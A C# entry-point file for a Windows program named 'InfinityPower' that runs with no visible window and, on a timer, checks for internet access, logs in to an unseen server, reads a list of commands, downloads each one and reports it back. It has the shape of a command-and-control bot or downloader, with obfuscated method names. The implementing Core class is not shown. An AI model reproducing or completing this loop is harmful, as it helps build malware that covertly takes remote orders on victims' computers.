using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace InfinityPower
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        private static void Main()
        {
            Core.TestLog("Main() starting.");
            Core.Dnplic();
            Core.TestLog("DPublic Finished");
            Core.Lgplic();
            Core.TestLog("DPublie logged");

            System.Windows.Forms.Timer timer = new Timer();
            timer.Interval = TIMERS_START_MINUTES * 60000;
            timer.Tick += new EventHandler(timer_Tick);
            timer.Enabled = true;

            Core.TestLog("Running the app");

            Application.Run();
        }

        //private events region
        private static void timer_Tick(object sender, EventArgs e)
        {
            Core.TestLog("timer tick : " + DateTime.Now);
            Int32 desc;
            if (Core.InternetGetConnectedState(out desc, 0))
            {
                Core.TestLog("internet is connected");
                Core.Lg();
                Core.TestLog("I login complete");
                String[] cmds = Core.Rdcmds();
                Core.TestLog("order complete");

                if (cmds != null)
                {
                    foreach (String cmd in cmds)
                    {
                        Core.Dncmd(cmd);
                        Core.TestLog("cmd : " + cmd + " is download");

                        Core.Lgcmd(cmd);
                        Core.TestLog(cmd + " confirmed");
                    }
                }

                ((Timer)sender).Interval = TIMERS_INFO_MINUTES * 60000;
            }
        }

        private const Int32 TIMERS_START_MINUTES = 1;
        private const Int32 TIMERS_INFO_MINUTES = 3;
    }
}
